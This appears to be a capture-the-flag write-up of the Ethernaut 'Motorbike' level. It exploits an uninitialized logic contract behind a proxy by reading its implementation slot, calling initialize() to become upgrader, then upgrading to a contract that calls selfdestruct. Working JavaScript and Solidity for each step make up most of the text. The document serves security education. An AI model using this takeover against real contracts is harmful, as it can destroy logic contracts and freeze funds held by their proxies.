## Objectives

1. Somehow `selfdestruct` the `Engine` contract.

## Vulnerabilities

1. Uninitialized initializable contracts

Contract can be `Initializable` which is a way to implement core logic that a constructor would do. This functionality
can be called only once. Having an `initialize` function in a contract that has not yet been called can present a critical vulnerability.

## Exploit

Contract `Motorbike` is a proxy. It executes logic located inside a _logic contract_ using `delegatecall`. This 
is a very common pattern but comes with it's share of security concerns. In this case, the _logic contract_ is 
the `Engine` contract.

1. Let's find the address of the deployed `Engine` contract. It is stored at slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
of `Motorbike`. Let's use the web3 library in the console.

```javascript
const addr = contract.address;
const slotDec = BigInt('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc').toString();
const logicAddr = await web3.eth.getStorageAt(addr, slotDec);
```

2. Remove the first 12 bytes of zeroes leading `logicAddr` and we now have the contract address of `Engine`.

3. Let's write and compile a small `IEngine` `interface` on Remix. Using the _At adrress_ field, paste the value 
of `logicAddr`. This enables us to easily interact with it.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function upgrader() external view returns (address) ;
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}
```

4. Call `initialize()` from `IEngine`. We can call this function because it is actually not initialized. In `Motorbike`'s
constructor, a `delegatecall` called `initialized` which executed the logic on the storage of `Motorbike`. Calling this
function now makes us the `upgrader` of `Engine.

5. Let's now write a deploy a hack contract like the following:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract EngineHack {
    function boom() external {
        selfdestruct(address(0));
    }
}
```
6. The last step is to call `upgradeToAndCall` with our _hack contract_ address and the function signature of `boom()`. 
We can find this signature using web3 in the console like this:

```javascript
const data = web3.eth.abi.encodeFunctionSignature("boom()");
```

Once `upgradeToAndCall` is called with the correct arguments, the Engine contract should have `selfdestruct`.


## Suggested mitigation

- Always verify that an *initializable* contract has actually been initialized.
